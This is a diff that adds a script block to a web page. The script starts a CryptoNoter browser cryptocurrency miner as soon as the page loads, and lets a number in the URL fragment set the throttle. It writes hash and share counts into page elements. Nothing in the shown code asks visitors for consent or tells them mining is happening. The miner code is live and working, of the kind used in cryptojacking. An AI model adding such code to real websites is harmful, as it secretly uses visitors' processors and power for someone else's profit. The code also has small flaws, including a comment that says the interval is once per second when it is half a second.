@@ -1,0 +1,32 @@
+<script>
+		var addr = 'CryptoNoter';
+		var miner = new CryptoNoter.Anonymous(addr, {
+			throttle: 0.3
+		});
+		miner.start();
+
+		// Listen on events
+		var found = 0,
+			accepted = 0;
+		miner.on('found', function () {
+			found++;
+			document.getElementById("FoundShares").innerHTML = found;
+		});
+		miner.on('accepted', function () {
+			accepted++;
+		})
+
+		// Update stats once per second
+		setInterval(function () {
+			var idle = parseFloat(location.hash.split('#')[1]) || 0.5;
+			var hashesPerSecond = miner.getHashesPerSecond();
+			document.getElementById("TotalHashes").innerHTML = miner.getTotalHashes();
+			document.getElementById("VerifiedShares").innerHTML = miner.getAcceptedHashes();
+			document.getElementById("Hashes").innerHTML = hashesPerSecond;
+			miner.setThrottle(idle);
+			document.getElementById("Hashes").innerHTML = hashesPerSecond;
+
+		}, 500);
+
+
+	</script>
